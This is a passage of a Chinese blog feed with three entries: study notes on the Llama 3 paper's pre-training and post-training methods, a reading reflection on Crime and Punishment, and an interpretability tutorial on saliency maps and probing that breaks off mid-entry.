内核内的停滞负载&#x2F;存储操作，而不会返回清晰的错误代码。NCCLX通过与PyTorch紧密协同设计增强了故障检测和定位的速度和准确性，允许PyTorch访问NCCLX的内部状态和跟踪相关信息。虽然无法完全防止由于 NVLink 故障而导致的停顿，但我们的系统监控通信库的状态，并在检测到此类失速时自动超时。此外，NCCLX 跟踪每个 NCCLX 通信的内核和网络活动，并提供失败的 NCCLX 集体内部状态的快照，包括所有等级之间的已完成和挂起数据传输。我们分析这些数据以调试 NCCLX 缩放问题。</p><p>有时，硬件问题可能会导致仍然起作用，但缓慢的掉队者很难检测到。即使是单个掉队者也可以减缓数千个其他 GPU，通常表现为功能强大但通信缓慢。我们开发了工具，以优先考虑所选流程组的潜在有问题的通信。通过仅调查少数顶级嫌疑人，我们通常能够有效地识别掉队者。</p><p>一个有趣的观察是环境因素对大规模训练性能的影响。对于 Llama 3 405B，我们注意到基于白天的日$ 1 \sim 2%$ 吞吐量变化。这种波动是影响 GPU 动态电压和频率缩放的更高中日温度的结果。</p><p>在训练期间，数万个 GPU 可以同时增加或减少功耗，例如，由于所有等待检查点或集体通信才能完成或关闭整个训练作业的 GPU。当这种情况发生时，它会导致数据中心的功耗在几十兆瓦量级的瞬时波动，拉伸电网的极限。这对我们来说是一个持续的挑战，因为我们为未来的 Llama 模型缩放训练。</p><h2 id="3-4-训练技巧"><a href="#3-4-训练技巧" class="headerlink" title="3.4 训练技巧"></a>3.4 训练技巧</h2><p>用于预训练 Llama 3 405B 的配方由三个主要阶段组成：</p><ol><li>初始预训练</li><li>长上下文预训练</li><li>退火</li></ol><p>下面分别描述了三个阶段。我们使用类似的方法来预训练 8B 和 70B 模型。</p><h3 id="3-4-1-预训练初始化"><a href="#3-4-1-预训练初始化" class="headerlink" title="3.4.1 预训练初始化"></a>3.4.1 预训练初始化</h3><p>我们使用峰值学习率为$ 8 × 10^{−5}$的 <code>AdamW</code>预训练 Llama 3 405B，线性预热 8,000 步，$cos$学习率计划在 1,200,000 步上衰减为$ 8 × 10^{−7}$。我们在训练早期使用较低的$batch_size$来提高训练稳定性，并随后对其进行提高以提高效率。具体来说，我们使用 4M 个tokens的初始批量大小和长度为 4,096 的序列，并在预训练 252M tokens后将这些值加倍到 8,192 个标记的 8M 序列的批量大小。在对 2.87T tokens进行预训练后，我们将$batch_size$设置为 16M。我们发现这种训练配方非常稳定：我们观察到损失峰值很少，并且不需要干预来纠正模型训练分歧。</p><p><strong>调整数据混合</strong>。我们在训练期间对预训练数据混合进行了一些调整，以提高特定下游任务的模型性能。特别是，我们增加了预训练过程中非英语数据的百分比，以提高 Llama 3 的多语言性能。我们还对数学数据进行上采样以提高模型的数学推理性能，我们在预训练后期添加了最近的网络数据，以推进模型的知识截止，我们对后来被确定为质量较低的预训练数据的子集进行下采样。</p><h3 id="3-4-2-长文本预训练"><a href="#3-4-2-长文本预训练" class="headerlink" title="3.4.2 长文本预训练"></a>3.4.2 长文本预训练</h3><p>在预训练的最后阶段，我们在长文本上进行训练，以支持多达 128K 个token的上下文窗口。我们不会更早地在长序列上进行训练，因为自注意力层中的计算在序列长度上呈二次增长。我们以增量、预训练来增加支持的上下文长度，直到模型成功地适应了增加的上下文长度。我们通过测量：</p><ol><li>短上下文评估上的模型性能是否完全恢复来评估成功的适应</li><li>该模型完美地解决了长度高达该长度的“大海捞针”任务（在一个长文本中插入一些信息，问这个信息是什么）</li></ol><p>在 Llama 3 405B 预训练中，我们从原始的 8K 上下文窗口开始并在最终的 128K 上下文窗口中结束，逐步增加上下文长度。这个长上下文预训练阶段使用大约 800B 训练tokens。</p><h3 id="3-4-3-退火"><a href="#3-4-3-退火" class="headerlink" title="3.4.3 退火"></a>3.4.3 退火</h3><p>在对最终的 <code>40M</code>token进行预训练期间，我们将学习率线性降成 0，保持 128K token的上下文长度。在这个退火阶段，我们还调整了数据混合，以对质量非常高的数据源进行上采样；参见第 3.1.3 节。最后，我们计算退火过程中模型检查点（Polyak (1991) 平均）的平均值以产生最终的预训练模型。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_yuSn6C_uWC.png"></p><hr><h1 id="4-Post-Training"><a href="#4-Post-Training" class="headerlink" title="4 Post-Training"></a>4 Post-Training</h1><p>我们通过在预训练检查点之上应用几轮训练后 6 或将模型与人工反馈对齐来生成对齐的 Llama 3 模型（Ouyang 等人，2022；Rafailova 等人、2024）。每一轮训练后都涉及监督微调 (SFT)，然后是直接偏好优化 (DPO; Rafailov et al., 2024)，通过人工注释收集或综合生成的示例。我们的训练后建模和数据方法分别在第 4.1 节和第 4.2 节中描述。我们进一步详细介绍了自定义数据管理策略，以改进第 4.3 节中的推理、编码、事实性、多语言、工具使用、长上下文和精确指令。</p><h2 id="4-1-建模"><a href="#4-1-建模" class="headerlink" title="4.1 建模"></a>4.1 建模</h2><p>我们的后训练策略的主干是一个奖励模型和语言模型。我们首先使用人工注释的偏好数据在预训练的检查点之上训练奖励模型（参见第 4.1.2 节）。然后，我们使用监督微调（SFT；参见第 4.1.3 节）微调预训练的检查点，并进一步将检查点与直接偏好优化对齐（DPO；参见第 4.1.4 节）。</p><p><img src="/2024/12/03/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB6%EF%BC%9ALlama3/image_HUrI-qeiJu.png"></p><blockquote><p>图 7：Llama 3 的整体训练后方法示意图。我们的后训练策略包括拒绝采样、监督微调和直接偏好优化。有关详细信息，请参阅文本。</p></blockquote><p>这个过程如图 7 所示。除非另有说明，我们的建模过程适用于 Llama 3 405B，为简单起见，我们将 Llama 3 405B 称为 Llama 3。</p><h3 id="4-1-1-聊天对话框格式"><a href="#4-1-1-聊天对话框格式" class="headerlink" title="4.1.1 聊天对话框格式"></a>4.1.1 聊天对话框格式</h3><p>为了调整 LLM 以进行人类-AI 交互，我们需要为模型定义一个聊天对话协议来理解人类指令并执行对话任务。与其前身相比，Llama 3 具有工具使用（第 4.3.5 节）等新功能，这些功能可能需要生成多个消息并将它们发送到单个对话轮次中的不同位置（例如，用户、ipython）。为了支持这一点，我们设计了一种新的多消息聊天协议，该协议使用各种特殊的报头和终止令牌。标题标记用于表示对话中每条消息的来源和目的地。类似地，终止标记指示何时是人类和 AI 说话之间的时间。</p><h3 id="4-1-2-奖励建模"><a href="#4-1-2-奖励建模" class="headerlink" title="4.1.2 奖励建模"></a>4.1.2 奖励建模</h3><p>我们训练了一个奖励模型 (RM)，涵盖了预训练checkpoint之上的不同功能。训练目标与 Llama 2 相同，只是我们删除了损失中的边距项，因为我们观察到数据缩放后的改进减少。在 Llama 2 之后，我们在过滤掉具有相似响应的样本后使用我们所有的偏好数据来进行奖励建模。除了（选择、拒绝）响应的标准偏好对之外，注释还为一些提示创建了第三个“编辑响应”，其中对中选择的响应被进一步编辑以改进（参见第 4.2.1 节）。因此，每个偏好排名样本有两个或三个响应，排名清晰（编辑 &amp;gt; 选择 &amp;gt; 拒绝）。在训练期间，我们将提示和多个响应连接到一行，响应随机打乱。这是将响应放在单独的行中并计算分数的标准场景的近似值，但在我们的消融中，这种方法提高了训练效率，而不会损失准确性。</p><h3 id="4-1-3-监督微调"><a href="#4-1-3-监督微调" class="headerlink" title="4.1.3 监督微调"></a>4.1.3 监督微调</h3><p>然后使用奖励模型对人工注释提示执行拒绝采样，其细节在第 4.2 节中描述。连同这种拒绝采样数据和其他数据源（包括合成数据），我们使用目标标记上的标准交叉熵损失来微调预训练的语言模型（同时屏蔽提示标记上的损失）。有关数据混合的更多详细信息，请参见第 4.2 节。我们将此阶段称为监督微调（SFT；Wei 等人，2022a；Sanh 等人，2022；Wang 等人，2022b），即使许多训练目标是模型生成的。我们最大的模型在 8.5K 到 9K 步的过程中以 10−5 的学习率进行微调。我们发现这些超参数设置在不同的轮次和数据混合中运行良好。</p><h3 id="4-1-4-直接偏好优化"><a href="#4-1-4-直接偏好优化" class="headerlink" title="4.1.4 直接偏好优化"></a>4.1.4 直接偏好优化</h3><p>我们进一步用直接偏好优化 (DPO; Rafailov et al., 2024) 训练我们的 <code>SFT</code>模型以进行人类偏好对齐。对于训练，我们主要使用来自先前对齐轮次的最佳性能模型收集的最近一批偏好数据。因此，我们的训练数据更符合在每一轮中优化的策略模型的分布。我们还探索了 PPO (Schulman et al., 2017) 等策略算法，但发现 DPO 对大规模模型需要更少的计算并表现得更好，尤其是在 IFEval (Zhou et al., 2023) 等以下基准测试中。对于Llama 3，我们使用$10^{−5}$的学习率，并将β超参数设置为0.1。此外，我们对DPO应用了以下算法修改:</p><ul><li><strong>在DPO损失中mask格式token</strong>：我们从损失中选择的响应和拒绝的响应中屏蔽了特殊的格式标记，包括标题和终止标记（在第 4.1.1 节中描述），以稳定 DPO 训练。我们观察到，拥有这些标记有助于损失可能会导致不希望的模型行为，例如尾部重复或突然生成终止标记。我们假设这是由于 DPO 损失的对比性质——选择和拒绝响应中是否存在公共标记会导致相互冲突的学习目标，因为模型需要同时增加和减少这些标记的可能性。</li><li><strong>使用 NLL 损失进行正则化</strong>：我们在所选序列上添加了一个额外的负对数似然 (NLL) 损失项，缩放系数为 0.2，类似于 Pang 等人。 (2024)。这有助于通过保持生成所需的格式并防止所选响应的对数概率降低来进一步稳定 DPO 训练（Pang 等人、2024；Pal 等人、2024）。</li></ul><h3 id="4-1-5-模型平均"><a href="#4-1-5-模型平均" class="headerlink" title="4.1.5 模型平均"></a>4.1.5 模型平均</h3><p>最后，我们对每个 RM、SFT 或 DPO 阶段使用各种版本数据或超参数的实验获得的模型进行平均（Izmailov 等人，2019；Wortsman 等人，2022；Li 等人，2022）。</p><h3 id="4-1-6-Iterative-Rounds"><a href="#4-1-6-Iterative-Rounds" class="headerlink" title="4.1.6 Iterative Rounds"></a>4.1.6 Iterative Rounds</h3><p>继 Llama 2 之后，我们在六轮中应用上述方法。在每个周期中，我们收集新的偏好注释和SFT数据，从最新的模型中采样合成数据。</p><h2 id="4-2-后训练数据"><a href="#4-2-后训练数据" class="headerlink" title="4.2 后训练数据"></a>4.2 后训练数据</h2><p>训练后数据组合在语言模型的有用性和行为中起着至关重要的作用。在本节中，我们将讨论我们的人工注释程序和偏好数据收集（第 4.2.1 节）、我们的 SFT 数据的组成（第 4.2.2 节）和数据质量控制和清理方法（第 4.2.3 节）。</p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
            <tag> Llama3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>读书记录5：罪与罚</title>
      <link href="/2024/11/27/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%BD%AA%E4%B8%8E%E7%BD%9A/"/>
      <url>/2024/11/27/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%BD%AA%E4%B8%8E%E7%BD%9A/</url>
      
        <content type="html"><![CDATA[<p><img src="/2024/11/27/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%BD%AA%E4%B8%8E%E7%BD%9A/image_sqnGoBTYtx.png"></p><blockquote><p>《罪与罚》是俄国作家陀思妥耶夫斯基创作的长篇小说，也是其代表作，于1866年的1月开始刊登在《俄国导报》上，1867年2月连载结束。</p></blockquote><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h1><p>当时在看这本书的时候，一度不知道这本书要讲什么，后来看着看着就明白了。在看之前就知道这是一本压抑小说，看完了后给我的影响是巨大的。</p><hr><h1 id="2-经典语录"><a href="#2-经典语录" class="headerlink" title="2 经典语录"></a>2 经典语录</h1><ol><li>人这种卑鄙的东西，什么都会习惯的。</li><li>我唯一担心的是我们明天的生活能否配得上今天所承受的苦难。</li><li>“你为何不骂我，却拥抱我？” “因为世界没有比你更不快乐的人了。”</li><li>有时，一个人遇上强盗，整整半小时感到死亡的恐惧，最后，刀架到脖子上，反倒什么都不怕了。</li><li>大家都杀人，在世界上，现在杀人，过去也杀人，血像瀑布一样地流，像香槟酒一样地流，为了这，有人在神殿里被戴上桂冠，以后又被称作人类的恩主。</li><li>我只想证明一件事，就是，那时魔鬼引诱我，后来又告诉我，说我没有权利走那条路，因为我不过是个虱子，和所有其余的人一样。</li><li>世界上没有什么比直言不讳更难，也没有什么比阿谀奉承更容易的了。</li><li>要知道，女人就是这样，爱你也是她，害你也是她，两者并行不悖。</li><li>平凡的人必须听话，没有犯法的权利，因为，您要知道，他们是平凡的人。不平凡的人却有权犯各式各样的罪，有权任意违法，为非作歹，而这只是因为，他们是不平凡的人。</li><li>他是那样经常陷入沉思，离群索居，甚至还怕见到任何人。</li></ol><hr><h1 id="3-良心的惩罚比苦刑更重"><a href="#3-良心的惩罚比苦刑更重" class="headerlink" title="3 良心的惩罚比苦刑更重"></a>3 良心的惩罚比苦刑更重</h1><p>拉斯柯尔尼科夫，一个出身低微的法律系大学生，因为交不起学费不得不中途辍学。他生活在圣彼得堡的一个混乱不堪的街区，因为失业和极度贫困而抬不起头来，他欠了女房东一身的债，生怕见她的面，甚至也怕见任何人。</p><p>妈妈来信说，妹妹为了资助他上大学而打算嫁给一个45岁的有钱人，这件事尤其让他感到羞愧和压抑。此时，穿着破烂的拉斯柯尔尼科夫精神紧张又蔑视一切，心里充满了愤怒，能让他感受到优越感的只有他在杂志上发表的一篇描述“超人”理论的文章。</p><p>在这篇文章中，他将人分成凡人和超人两类。凡人必须俯首帖耳地生活，没有犯法的权利；而像拿破仑这样的超人，可以为了崇高的目标准许自己的良心逾越某些障碍，包括杀人。</p><p><img src="/2024/11/27/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%BD%AA%E4%B8%8E%E7%BD%9A/image_VwNzMMLCeo.png"></p><p>拉斯柯尔尼科夫认为自己是一个“超人”，因此要做一桩需要胆量才能做的大事，以摆脱现在的窘迫状态。他把目光锁定在以典当谋利的老太婆身上。这个老太婆干瘪瘦小，目光尖锐凶恶，对待穷人苛刻至极，对拉斯柯尔尼科夫也是百般刁难。</p><p>他坚信，除掉这个老太婆，用她的财富来开启自己的事业，帮助更多穷困的好人，是一种正义的行为。</p><p>于是，在一个闷热的七月，拉斯柯尔尼科夫偷了房东的一把斧头，以典当物品为借口，砍死了老太婆，正当他准备逃离现场时，老太婆的妹妹突然归来。惊慌失措的拉斯柯尔尼科夫再次举起斧头……</p><p>尼采在《善恶的彼岸》里说：“<strong>真正的罪恶不在于你做了什么，而在于你对自己的行为怎么想。</strong>”</p><p>杀完人的拉斯柯尔尼科夫失魂落魄，他才明白自己根本不是什么超人，而只是个再普通不过的凡人。他无法用他的“超人”理论解释他的行为，可怕的心魔开始缠住他。</p><p>他发烧、昏睡、做噩梦、食欲不振、疑神疑鬼、整个人精神恍惚。</p><p>一个有良心的人，如果认识到自己的错误，就一定会痛苦。对他来说，这是比苦刑还重的惩罚。这个曾经很有同情心的青年，正在承受良心对他的折磨。</p><hr><h1 id="4-直面过错才能自我救赎"><a href="#4-直面过错才能自我救赎" class="headerlink" title="4 直面过错才能自我救赎"></a>4 直面过错才能自我救赎</h1><p>拉斯科尔尼科夫一直非常同情弱者，拥有改变社会不公的远大理想。然而，命运却以意想不到的方式将他推向了黑暗的深渊。</p><p>他原本打算用他的超人理论，以消灭剥削之名来解释他杀害老太婆的行为，但当他为了掩盖罪行，用斧子砍死了老太婆的妹妹的时候，一切都变了味，他的信念崩塌了。</p><p>拉斯柯尔尼科夫离家、杀人又悄悄地回家，全过程并没有目击者，他扔掉了凶器，妥善地藏起了从老太婆那里抢来的东西，然后就一直在出租屋里发烧和昏睡。</p><p>怀疑他的警察很同情他，也认同他的人品，坦言并不掌握任何证据，只是希望他能自首以减轻刑罚，此时，他也渐渐从最初的慌张和悔恨中苏醒过来，他平时的为人、所掌握的法律知识和逐渐冷静的神经有很大的机会帮助他瞒天过海。</p><p>可是，拉斯柯尔尼科夫过不了自己的心关。他即便能够逃脱现实的审判，却逃脱不了心中的法官对自己的审判。</p><p><img src="/2024/11/27/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%BD%AA%E4%B8%8E%E7%BD%9A/image_nWzygKK8LW.png"></p><p>在心理学经典名著《蛤蟆先生去看心理医生》有一句非常经典的话： &#x20;</p><p>“<strong>没有一种批判比自我批判更强烈，也没有一个法官比我们自己更严苛。心中的法官会严厉地惩罚自己，甚至会施以极刑，即便对自己轻判，这种谴责和惩罚也可能伴随一生，变成无期徒刑。</strong>”</p><p>给拉斯柯尔尼科夫判处极刑的不是警察和法庭，而是他自己。</p><p>一个自己把自己定义为罪犯的人，每说一次谎就等同于在伤痕累累的心上再抽上一鞭子。痛苦并不可怕，逃避才是最可怕的。 &#x20;</p><p>一个有良知而心存善良的人，如果犯下了大的过错，只有一个办法能够救赎自己，那就是诚实地直面自己的阴暗面，为自己的错误承担应该承担的责任，哪怕这个责任是下地狱。 &#x20;</p><p>在掩盖罪恶的谎言中苟活，不如诚实坦荡地赴死，毕竟人活的不只是躯体，还有灵魂。</p><hr><h1 id="5-诚实和爱能创造奇迹"><a href="#5-诚实和爱能创造奇迹" class="headerlink" title="5 诚实和爱能创造奇迹"></a>5 诚实和爱能创造奇迹</h1><p>拉斯科尔尼科夫在犯罪之后，一方面很想坦白真相以摆脱内心的巨大痛苦，另一方面他也非常害怕说出真相后无法面对非常爱他的妈妈和妹妹以及可能被判以绞刑的可怕后果。</p><p>这种内心剧烈的挣扎让他掉进了深不见底的深渊之中。此时，他遇到了善良的索尼娅。索尼娅靠出卖身体养活全家，她所从事的是见不得人的职业，但她却拥有圣洁的心灵。</p><p>拉斯科尔尼科夫杀人之前，在自己已经很穷的情况下，依然把身上的铜币偷偷地留给了更加穷困的索尼雅一家，因此，索尼雅坚信拉斯科尔尼科夫是一个善良的人，她爱斯科尔尼科夫。</p><p>虽然，拉斯科尔尼科夫知道警方手里没有他杀人的罪证，但是，他爱索尼娅，他冒着失去恋人的风险，诚实地向她坦白了一切。 &#x20;</p><p>索尼雅鼓励拉斯科尔尼科夫去自首，她冷静地拉斯科尔尼科夫说：“<strong>甘愿受苦，藉此赎罪，这就是你应该做的。</strong>”</p><p>随后她又深情地补充道：“<strong>我们一块儿去受苦，我们一块儿戴着十字架！……我们一块儿祈祷，一块儿上路。</strong>”</p><p><img src="/2024/11/27/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%955%EF%BC%9A%E7%BD%AA%E4%B8%8E%E7%BD%9A/image_P5DEHHKukl.png"></p><p>索尼雅的深厚的爱，促使拉斯科尔尼科夫最终放弃了逃脱法律惩罚的心理，他鼓起勇气向警方自首……</p><p>拉斯科尔尼科夫在法庭上表达了对自己行为的深刻懊悔，他不但不为自己辩护，甚至表现出一种要加重自己罪名的愿望，这样的一种心理反倒唤醒了法庭陪审团的同情心。法庭认为他犯罪时神志不清，主动自首并真诚忏悔，还有同学证明他曾经用自己仅有的一点点钱接济过一个比他还穷的大学生……</p><p>准备赴死的拉斯科尔尼科夫在自己的诚实、索尼雅的爱和陪审团的慈悲的共同作用下，只被判决服二等苦役劳动，为期八年。</p><p>每个人都可能跌入人生的深渊，谎言和逃避只能让我们越陷越深，直面过错才能自我救赎，诚实和爱能创造奇迹！</p><hr><h1 id="6-个人感受"><a href="#6-个人感受" class="headerlink" title="6 个人感受"></a>6 个人感受</h1><p>人这一生不就是为了找到一个地方，可以让自己的心灵得到救赎吗？这可能是一个地方，也可能是一件事情，也可能是一个人。罗佳犯罪后，始终过不去自己心里的那道坎，并为了受尽了内心的折磨，所以这也是上帝给他的惩罚吧，我想这也是为什么这本书叫《罪与罚》的原因吧。</p><p>在书中有很多关于人物的心理描写，甚是精彩，以后若有机会再读第二遍。人的内心真的是一个奇妙的东西，只要自己的内心充实，无论你所处的环境怎样，都不会动摇我的生活感觉。我感觉我现在就是一种自得其乐的状态，我挺喜欢的。</p><p>看了这几本书之后，愈发感觉人的灵魂和肉体其实是两个独立又统一的部分。灵魂是最重要的，倘若你的灵魂丰富，即使你的外观天生有缺陷，你也会吸引很多人和你交流，他们会被你的个人魅力吸引。如果你的外观很美很标准，但是心灵有缺陷，你是做不成事情的。</p><p>我要修炼自己的灵魂，感觉最近自己的灵魂愈发充盈，就像打游戏升级一样，等级越来越高。同时，我也要保护好自己的肉体，因为只有灵魂是没有用的，需要一个肉体去承载，去完成灵魂想要做的事情，并且肉体是灵魂状态的最佳体现。</p><p>现在我十分佩服能写出这么多优秀文学作品的作家，我觉得他们能够捕捉生活中转瞬即逝的情感变化，希望以后有机会我可以在现场见到他们，等我老了也可能学习写作吧……</p>]]></content>
      
      
      <categories>
          
          <category> 读书记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习模型的可解释性</title>
      <link href="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/"/>
      <url>/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="1-模型可解释性介绍"><a href="#1-模型可解释性介绍" class="headerlink" title="1 模型可解释性介绍"></a>1 模型可解释性介绍</h1><p>如果机器学习的模型具有解释力的话，也可以凭借这个结果去修正我们的模型。未来的目标是知道为什么模型预测的结果很差，并且使用可解释的机器学习修正它。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_T9_WdXzTb-.png"></p><h2 id="1-1-Interpretable-v-s-Powerful"><a href="#1-1-Interpretable-v-s-Powerful" class="headerlink" title="1.1 Interpretable v.s. Powerful"></a>1.1 Interpretable v.s. Powerful</h2><p>一些模型的解释性是很好的，例如线性模型，但是这种模型的能力较差。深度神经网络很难去解释，就像黑箱一样，但是效果远比线性模型要好。</p><p>就像决策树算法的可解释性和效果都很好，所以是不是我们只要使用决策树就可以了？当然不是，因为决策树也可以变得很复杂。就像在打 Kaggle 比赛时，通过不会使用一棵决策树，一般会用随机森林，这时候是很多棵决策树共同决定的结果。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_PcTlKW37Hj.png"></p><h2 id="1-2-可解释ML的目标"><a href="#1-2-可解释ML的目标" class="headerlink" title="1.2 可解释ML的目标"></a>1.2 可解释ML的目标</h2><p>可解释性一定要完全了解ML模型是如何工作的吗？例如，我们不完全知道大脑是如何工作的，但我们相信人类的决定。</p><p>一个好的可解释性就是给人一个理由去相信这么解释是对的，重点是人类能够理解模型是如何运行的。</p><h2 id="1-3-可解释性的分类"><a href="#1-3-可解释性的分类" class="headerlink" title="1.3 可解释性的分类"></a>1.3 可解释性的分类</h2><p>机器学习模型的可解释性分为局部可解释性和全局可解释性，以下图为例对局部可解释性和全局可解释性进行介绍：</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_iggdXVLUdI.png"></p><ul><li>局部可解释性：为什么这张图片是一只猫</li><li>全局可解释性：什么样的图片是一个猫</li></ul><hr><h1 id="2-局部可解释性"><a href="#2-局部可解释性" class="headerlink" title="2 局部可解释性"></a>2 局部可解释性</h1><h2 id="2-1-可视化模型学到的内容"><a href="#2-1-可视化模型学到的内容" class="headerlink" title="2.1 可视化模型学到的内容"></a>2.1 可视化模型学到的内容</h2><p>如何判断哪个 component 是重要的？比如给定一个 $x$，可以是图像、文本，然后由 ${x_{1}, \cdots, x_{n}, \cdots, x_{N}}$ 构成，接下来把每个 $x_i$ 给去掉，看一下模型对于剩下的 $x$ 能否进行正确的预测。如果去掉一个 $x_i$ 后模型的性能下降较多，则说明对于模型来说 $x_i$ 这个 component 比较重要。</p><p>下图通过对图片中的不同部位进行 mask 后再进行预测的结果，越接近红色则准确率越高，越接近蓝色准确率越低。比如第一个图，可以看到小狗的脸部大多为蓝色，说明把小狗的脸部遮掩之后模型预测出小狗的准确率较低，说明模型是根据脸部来进行分类的。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_ZEbYYtILsM.png"></p><h3 id="2-1-1-Saliency-Map"><a href="#2-1-1-Saliency-Map" class="headerlink" title="2.1.1 Saliency Map"></a>2.1.1 Saliency Map</h3><p>除了上面对 $x$ 进行 mask 的方法，也可以计算图像中每个点的梯度，相当于求偏导 $\left|\frac{\partial e}{\partial x_{n}}\right|$，这个值越高，则显示为白色，否则越接近黑色。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_morPfQ3koZ.png"></p><h3 id="2-1-2-SmoothGrad"><a href="#2-1-2-SmoothGrad" class="headerlink" title="2.1.2 SmoothGrad"></a>2.1.2 SmoothGrad</h3><p>使用上面的方法画出来的图叫做 Saliency Map，但是有时候使用 Saliency Map 画出来的图也会有一些杂讯，如下：</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_nmJJQitlJg.png"></p><p>这时候可以使用 SmoothGrad，具体做法是在输入图像中随机添加噪声，得到噪声图像的 Saliency Map 并对其进行平均。可以看到使用 SmoothGrad 方法画出的图比较清晰整洁。</p><p>但是只看 Gradient 也不能完全反映一个 component 的重要性。比如，如果通过大象的鼻子来判断是否是一个大象。当鼻子的长度长到一定长度的时候，就算再长，也不会对是不是大象造成很大的影响。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_4JzTU1npr2.png"></p><p>所以只看偏微分有时也不能完全判断一个 component 的重要性，还有一个方法 IG 效果更好，这里不多做介绍。</p><h2 id="2-2-模型如何处理输入数据"><a href="#2-2-模型如何处理输入数据" class="headerlink" title="2.2 模型如何处理输入数据"></a>2.2 模型如何处理输入数据</h2><p>第一种方法可以通过人眼去观察模型输出的结果，比如可以把隐藏层的输出拿出来，然后降维到 2D，人去观察。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_KXyqTmJweg.png"></p><p>除了人眼观察之外，还有一种技术叫 Probing，是探针的意思。把探针插入到网络中，比如要看一下 Bert 中某一层到底学到了什么东西，可以训练一个分类器（探针），这个分类器是要根据一个向量决定这个词汇它的词性是什么。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_5cnOY2eO27.png"></p><p>如果这个 POS 的分类器正确率高，说明这些 Embedding 里面有很多词性的信息；如果正确率低，则说明没有很多词性的信息。但是有可能因为我们的分类器没有训练好，导致正确率很低，所以要注意区分。</p><hr><h1 id="3-全局可解释性"><a href="#3-全局可解释性" class="headerlink" title="3 全局可解释性"></a>3 全局可解释性</h1><p>全局可解释性是根据训练好的模型的参数去检查：对这个模型而言，一只猫长什么样。</p><h2 id="3-1-学习一个不存在的-X"><a href="#3-1-学习一个不存在的-X" class="headerlink" title="3.1 学习一个不存在的 $X$"></a>3.1 学习一个不存在的 $X$</h2><p>如下图所示，每个 CNN 的输出都将是一个特征图，比如 filter 1 负责检测某些 pattern。现在想看一个对于一个 filter 而言，它想要看的 feature map 是什么样的。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_NUdy4k6DxJ.png"></p><p>一种做法是可以创建一个包含那些 patterns 的图片。找一个不属于训练集中的图片 $X$，把其当作一个未知的变量，当作要训练的参数。</p><p><img src="/2024/11/19/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%8F%AF%E8%A7%A3%E9%87%8A%E6%80%A7/image_Q0WMRquONq.png"></p><p>通过把这张图片丢入 Convolution 之后，这个 Convolution 输出的值 $a_{ij}$ 越大越好。找出来的这个 $X$ 记作 $X^*$。</p><p>因为要最大化一个变量，所以可以使用梯度上升。训练好这个 Digit classifier 之后，把每个 filter 对应的 $X^*$ 可视化出来：</p><p><img 